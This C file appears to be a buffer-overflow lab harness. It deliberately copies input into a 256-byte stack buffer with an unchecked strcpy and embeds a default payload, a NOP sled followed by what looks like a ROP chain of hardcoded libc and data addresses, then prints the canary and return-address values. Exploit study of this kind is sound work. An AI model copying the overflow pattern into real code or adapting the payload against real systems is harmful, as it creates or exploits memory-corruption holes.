#define A 0x41

const char default_shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x60\xc1\xf0\xb7\x69\x6e\x64\x65\x24\xa0\x04\x08\x9f\x50\xe4\xb7\x60\xc1\xf0\xb7\x78\x2e\x70\x68\x28\xa0\x04\x08\x9f\x50\xe4\xb7\x60\xc1\xf0\xb7\x70\x61\x61\x61\x2c\xa0\x04\x08\x9f\x50\xe4\xb7\xae\xb2\xe8\xb7\x24\xa0\x04\x08\x64\xb9\xe4\xb7\xbb\x58\xe4\xb7\x01\x01\x01\x01\x2d\xa0\x04\x08\x34\x50\xea\xb7\x67\xaf\xe9\xb7\xbb\x58\xe4\xb7\x02\x02\x02\x02\x31\xa0\x04\x08\xf0\xe1\xf2\xb7\x34\x50\xea\xb7\x2c\xaf\xf5\xb7\x24\xa0\x04\x08\x67\xaf\xe9\xb7\x10\x4a\xf6\xb7\x75\x1a\xed\xb7\x39\x93\xf3\xb7\x72\x65\xef\xb7\x60\xc1\xf0\xb7\x63\x6f\x6e\x74\x34\xa0\x04\x08\x9f\x50\xe4\xb7\x60\xc1\xf0\xb7\x65\x6e\x74\x73\x38\xa0\x04\x08\x9f\x50\xe4\xb7\x64\xb9\xe4\xb7\xbb\x58\xe4\xb7\x34\xa0\x04\x08\x3c\xa0\x04\x08\x34\x50\xea\xb7\x67\xaf\xe9\xb7\x88\xa9\xf2\xb7\x39\x93\xf3\xb7\x10\x0a\xec\xb7\x75\x1a\xed\xb7\x30\x0a\xec\xb7\x75\x1a\xed\xb7";

long *return_addr, *canary_h, *canary_l;

/**
    Stack:
    ------------------------------------------------
    | buffer    | Canary bytes | EBP     | RET     |
    | 256 bytes | 8 bytes      | 4 bytes | 4 bytes |
    ------------------------------------------------

    *return_addr, *canary_h, *canary_l cannot be local variables because they will end up on the stack and be overwritten.
    By making them global variables we can examine the return address without GDB.
**/

int main(int argc, char *argv[]) {

    char buffer[256];

    return_addr = buffer + 256 + 8 + 4;
    canary_h = buffer + 256;
    canary_l = buffer + 256 + 4;

    // For reference sake - to see where the buffer ends and begins more clearly
    memset(buffer, A, sizeof(buffer));

    // To check if shellcode is broken
    printf("\nargc: %d\n", argc);

    printf("Contents of return address before buffer overflow: %010p\n", *return_addr);

    printf("Canary bytes: %010p %010p\n", *canary_h, *canary_l);

    printf("Buffer address: %010p\n", buffer);

    printf("Return address: %010p\n", return_addr);

    if (argc > 1) {
        strcpy(buffer, argv[1]);
    } else {
        memcpy(buffer, default_shellcode, sizeof(default_shellcode)/sizeof(char));
    }   

    printf("Contents of return address after buffer overflow: %010p\n\n", *return_addr);
        
    return 0;
}